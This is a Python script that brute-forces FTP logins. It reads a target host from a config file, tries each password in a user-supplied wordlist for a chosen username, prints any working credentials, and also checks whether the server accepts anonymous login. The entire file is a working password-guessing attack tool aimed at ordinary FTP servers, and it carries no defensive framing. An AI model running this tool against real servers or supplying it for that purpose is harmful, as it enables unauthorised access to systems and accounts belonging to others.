import sys
from ftplib import FTP
def check_anonymous(target):
    try:
        ftp = FTP(target)
        ftp.login()
        print("\n[!] Anonymous Login Working")
        print("\n[*] Username: anonymous")
        print("\n[*] Password: anonymous")
    except:
        pass

def ftplogin(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print("\n[!] Working Credentials Found")
        print("\n[*] Username: %s" % username)
        print("\n[*] Password: %s" % password)
        exit()
    except:
        pass

def bruteforce(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftplogin(target, username, word)
    except:
        print("No Password List File Found Under Name: %s\nCurrent Configuration: %s\nAdd List to your config." % (wordlist,wordlist))
        exit()

def start():
    from configparser import ConfigParser
    import os
    global wordlist, target, username
    config = ConfigParser()
    path = str(os.path.expanduser('~')) + "/config.cfg"
    config.read(path)
    target = config['DEFAULT']['rhost']
    wordlist = input("Enter Path To Password List: ")
    username = input("Enter Username to Attempt To Connect Under: ")
    bruteforce(target, username, wordlist)
    check_anonymous(target)
    print("[!] Bruteforce Complete [!]")
